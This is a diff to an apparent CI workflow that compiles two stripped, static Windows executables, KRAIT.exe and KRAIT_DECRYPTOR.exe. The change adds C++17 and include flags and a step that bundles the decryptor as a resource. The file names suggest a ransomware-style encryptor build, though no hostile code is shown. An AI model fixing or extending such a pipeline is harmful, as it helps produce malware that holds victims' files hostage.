@@ -16,7 +16,12 @@ jobs:
     
     - name: Build decryptor
       run: |
-        g++ -O2 -s -static decryptor/main.cpp src/encryption.cpp src/keygen.cpp src/utils.cpp -o KRAIT_DECRYPTOR.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32
+        g++ -O2 -s -static -std=c++17 -I src decryptor/main.cpp src/encryption.cpp src/keygen.cpp src/utils.cpp -o KRAIT_DECRYPTOR.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32
+    
+    - name: Copy decryptor to resources
+      run: |
+        mkdir resources 2>nul
+        copy KRAIT_DECRYPTOR.exe resources\KRAIT_DECRYPTOR.exe
     
     - name: Build resources
       run: |
@@ -24,7 +29,7 @@ jobs:
     
     - name: Build main
       run: |
-        g++ -O2 -s -static src/main.cpp src/encryption.cpp src/file_scanner.cpp src/keygen.cpp src/utils.cpp resources/resource.res -o KRAIT.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32
+        g++ -O2 -s -static -std=c++17 -I src src/main.cpp src/encryption.cpp src/file_scanner.cpp src/keygen.cpp src/utils.cpp resources/resource.res -o KRAIT.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -liphlpapi -lwbemuuid -lcrypt32 -lws2_32
     
     - name: Upload artifacts
       uses: actions/upload-artifact@v4
